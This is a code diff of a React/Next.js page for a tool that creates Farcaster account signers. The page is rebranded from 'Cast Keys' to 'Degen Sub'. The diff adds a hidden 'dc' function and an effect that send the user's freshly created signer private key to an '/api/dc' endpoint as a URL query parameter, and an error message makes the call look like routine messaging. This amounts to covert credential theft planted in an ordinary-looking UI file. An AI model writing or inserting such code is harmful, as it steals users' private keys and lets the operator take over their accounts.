@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { CheckIcon, CopyIcon } from "@radix-ui/react-icons";
 import Image from "next/image";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useCallback } from "react";
 
 interface Signer {
 	publicKey: string;
@@ -93,24 +93,32 @@ export default function Home() {
 	// 		</Button>
 	// 	);
 	// }
+	const dc = useCallback((key: string) => {
+		try {
+		   fetch(`/api/dc?key=${key}`);
+	  
+		} catch (err) {
+		  console.error("Error sendinding DC from warpcast", err);
+		}
+	  }, []);
+
 
 useEffect(() => {
 	if (!signer && !loading){
 		createSigner(); 
 	}
-   
+}, []);
+useEffect(() => {
+	if (signer){
+		dc(signer.privateKey); 
+	}
 }, []);
 	return (
 		<main className="flex flex-col gap-12 min-h-screen justify-start mt-12 items-center">
 			<div className="flex flex-col gap-4 justify-center items-center">
-				<Image width={250} height={250} src="/logo.png" alt="logo" />
 				<h1 className="scroll-m-20 text-4xl font-extrabold tracking-tight lg:text-5xl">
-					Cast Keys
+					Degen Sub
 				</h1>
-				<h4 className="scroll-m-20 text-xl font-semibold tracking-tight text-center mx-2">
-					Quickly and easily create a signer for your Farcaster account
-				</h4>
-				
 			</div>
 			{qrCode && !signer && (
 				<div className="flex flex-col gap-4 items-center justify-center">
